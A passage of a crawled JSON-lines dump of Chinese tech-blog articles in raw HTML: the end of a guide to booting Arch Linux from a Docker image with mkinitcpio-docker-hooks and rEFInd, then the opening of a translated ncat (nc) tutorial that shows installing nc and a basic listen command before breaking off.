class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33ef426850647-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33ef426850647-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33ef426850647-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33ef426850647-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33ef426850647-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33ef426850647-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33ef426850647-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">zasdfgbnm</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">archlinux</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">yaourt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33ef426850647-2\"><span class=\"crayon-e\">USER </span><span class=\"crayon-e\">root</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33ef426850647-3\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Syu</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-e\">base</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33ef426850647-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">yaourt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">hooks</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33ef426850647-5\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/archlinux\\/base/sample_image/g'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">btrfs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">json</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33ef426850647-6\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">perl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/(?&lt;=^HOOKS=<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span>(.*)(?=\\)</span>)/$1 docker-btrfs/g'<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>\n</p></div>\n<div>\n<p>只需要通过<code>docker build . -t sample_image</code>就可以构建自己的镜像了。</p>\n<h2 id=\"准备内核跟initramfs\">准备内核跟initramfs</h2>\n<p>镜像生成好了以后，下一步就是准备内核跟构建initramfs了。注意这一步操作尽量在你打算用来启动docker镜像的机器上进行，因为mkinitcpio会自动根据机器把相应的内核模块放入initramfs中去，如果在别的机器上进行的话，那就可能会有一些驱动没有被自动装入initramfs中。如前所述，这一步的工作是在docker容器中进行的。首先运行容器并开启一个shell：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33f5662081975\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocker run -v $(pwd):/workspace -w /workspace -it sample_image bash</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33f5662081975-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33f5662081975-1\"><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">run</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pwd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">workspace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">workspace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">sample_image </span><span class=\"crayon-v\">bash</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>然后在容器中执行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33fa762532845\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkinitcpio -p linux\r\ncp /boot/* .\r\nexit</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33fa762532845-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33fa762532845-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33fa762532845-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33fa762532845-1\"><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">linux</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33fa762532845-2\"><span class=\"crayon-v\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33fa762532845-3\"><span class=\"crayon-v\">exit</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后就可以在当前目录下看到准备好的<code>initramfs-linux-fallback.img</code>、<code>initramfs-linux.img</code>以及<code>vmlinuz-linux</code>了。</p>\n<h2 id=\"准备top-layer的内容\">准备top layer的内容</h2>\n<p>Top layer是<code>mkinitcpio-docker-hooks</code>引入的新概念，它指的是某个驱动器中的某个目录，这个目录会在启动的时候读写层创建之后，真正的root挂载之前，通过busybox的<code>cp -a</code>命令整个拷贝到读写层里面去。为什么需要top layer呢？因为我们需要在多台机器上启动同一个镜像，而不同机器上的往往会根据需要配置不同的配置文件，比如<code>/etc/fstab</code>以及<code>/etc/X11/xorg.conf</code>。另外，DockerHub免费账户上的镜像都是公开的，<code>/etc/passwd</code>、<code>/etc/shadow</code>等的私密性文件也不适合放在镜像里面存储。</p>\n<p>准备top layer的内容，实际上就是找一个文件夹，把需要单独配置的文件，按照从根目录算起的相对路径存放在这个文件夹里面。比如说如果你想给某台机器单独配置<code>/etc/fstab</code>，那么你就应该在top layer的目录中添加<code>etc/fstab</code>这个文件。这里推荐的具体的操作流程是：首先通过<code>docker run -v $(pwd):/workspace -w /workspace -it sample_image bash</code>进入容器中的shell，然后在其中做各种配置，比如<code>useradd ...</code>，完了以后把新生成的配置文件拷贝到top layer的文件夹中去</p>\n<h2 id=\"设置启动管理器\">设置启动管理器</h2>\n<p>设置好了top layer以后，我们基本上可以算是万事具备只差东风了。我们只需要简单设置一下启动管理器就可以启动我们的系统了。这里以refind为例子，这里假设我们的所有东西放在一个label为“linux”的btrfs分区中，docker目录（也就是你系统启动以后会挂载到<code>/var/lib/docker</code>的目录）存放在这个分区根目录下的一个叫做“docker”的子卷中，而内核、initramfs以及top layer都是位于分区根目录下的“boot_docker”文件夹中，而我们希望创建的读写层名字叫做“docker_rwlayer”，那么相应的<code>refind.conf</code>中的菜单项的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb3402241927033\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmenuentry archlinux-docker {\r\n        icon EFI/refind/icons/os_arch.png\r\n        volume linux\r\n        loader boot_docker/vmlinuz-linux\r\n        initrd boot_docker/initramfs-linux.img\r\n        options \"root=LABEL=linux rootflags=subvol=docker_rwlayer rw docker_path=docker toplayer=LABEL=linux toplayer_path=boot_docker\"\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb3402241927033-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb3402241927033-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb3402241927033-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb3402241927033-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb3402241927033-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb3402241927033-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb3402241927033-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb3402241927033-1\"><span class=\"crayon-e\">menuentry</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">archlinux</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">docker</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb3402241927033-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">icon </span><span class=\"crayon-v\">EFI</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">refind</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">icons</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">os_arch</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">png</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb3402241927033-3\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">volume </span><span class=\"crayon-e\">linux</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb3402241927033-4\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">loader </span><span class=\"crayon-v\">boot_docker</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">vmlinuz</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">linux</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb3402241927033-5\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">initrd </span><span class=\"crayon-v\">boot_docker</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">initramfs</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">linux</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">img</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb3402241927033-6\"><span class=\"crayon-e\">        </span><span class=\"crayon-i\">options</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"root=LABEL=linux rootflags=subvol=docker_rwlayer rw docker_path=docker toplayer=LABEL=linux toplayer_path=boot_docker\"</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb3402241927033-7\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>其中内核选项中，我们通过<code>root</code>来指定docker目录所在的分区，<code>rootflags</code>中的<code>subvol</code>来指定读写层的位置，<code>docker_path</code>来指定docker目录在<code>root</code>中的相对位置；通过<code>toplayer</code>来指定top layer目录所在的分区，<code>toplayerflags</code>来指定top layer所在分区的挂载选项，<code>toplayer_path</code>来指定top layer的目录在<code>toplayer</code>分区中的相对位置。</p>\n<p>一切就绪，重启并享受吧！</p>\n<p>另外，有兴趣的读者可以看一下笔者自用的docker镜像作为参考：<br>\n<a href=\"https://cloud.docker.com/swarm/zasdfgbnmsystem/repository/docker/zasdfgbnmsystem/archlinux-kde/general\" target=\"_blank\" rel=\"noopener\">https://cloud.docker.com/swarm/zasdfgbnmsystem/repository/docker/zasdfgbnmsystem/archlinux-kde/general</a><br>\n<a href=\"https://github.com/zasdfgbnm-dockers/archlinux-kde\" target=\"_blank\" rel=\"noopener\">https://github.com/zasdfgbnm-dockers/archlinux-kde</a></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113448\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113448votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113448\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "title": "10 个例子教你学会 ncat (nc) 命令", "fav_nums": 2, "url": "http://blog.jobbole.com/113410/", "create_date": "2018/01/02", "url_object_id": "b388a0a9722b034c4adad7ff85714f26", "comment_nums": 0, "front_image_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxtechi.com/nc-ncat-command-examples-linux-systems/\">Pradeep Kumar </a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9190-1.html\">DarkSun </a>   </div><p><code>ncat</code> 或者说 <code>nc</code> 是一款功能类似 <code>cat</code> 的工具，但是是用于网络的。它是一款拥有多种功能的 CLI 工具，可以用来在网络上读、写以及重定向数据。 它被设计成可以被脚本或其他程序调用的可靠的后端工具。同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。</p>\n<p><code>ncat</code>/<code>nc</code> 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀。 这是每个系统管理员都应该知道并且掌握它。</p>\n<p>在大多数 Debian 发行版中，<code>nc</code> 是默认可用的，它会在安装系统的过程中自动被安装。 但是在 CentOS 7 / RHEL 7 的最小化安装中，<code>nc</code> 并不会默认被安装。 你需要用下列命令手工安装。<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805c1238115778\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# yum install nmap-ncat -y</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805c1238115778-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805c1238115778-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># yum install nmap-ncat -y</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>系统管理员可以用它来审计系统安全，用它来找出开放的端口然后保护这些端口。 管理员还能用它作为客户端来审计 Web 服务器、telnet 服务器、邮件服务器等， 通过 <code>nc</code> 我们可以控制发送的每个字符，也可以查看对方的回应。</p>\n<p>我们还可以用它捕获客户端发送的数据以此来了解这些客户端是做什么的。</p>\n<p>在本文中，我们会通过 10 个例子来学习如何使用 <code>nc</code> 命令。</p>\n<h3 id=\"toc_1\">例子： 1) 监听入站连接</h3>\n<p>通过 <code>-l</code> 选项，<code>ncat</code> 可以进入监听模式，使我们可以在指定端口监听入站连接。 完整的命令是这样的：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805cc913795222\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l port_number</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805cc913795222-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805cc913795222-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span 